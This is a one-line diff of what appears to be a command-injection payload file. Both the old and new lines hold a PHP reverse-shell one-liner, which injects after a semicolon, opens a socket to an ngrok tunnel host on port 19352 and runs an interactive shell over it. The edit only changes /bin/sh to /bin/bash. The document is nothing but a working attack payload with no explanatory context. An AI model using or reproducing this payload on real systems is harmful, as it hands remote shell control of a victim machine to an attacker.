@@ -1,1 +1,1 @@
-;php -h;php -r '$sock=fsockopen("0.tcp.ngrok.io",19352);exec("/bin/sh -i <&3 >&3 2>&3");';
+;php -h;php -r '$sock=fsockopen("0.tcp.ngrok.io",19352);exec("/bin/bash -i <&3 >&3 2>&3");';
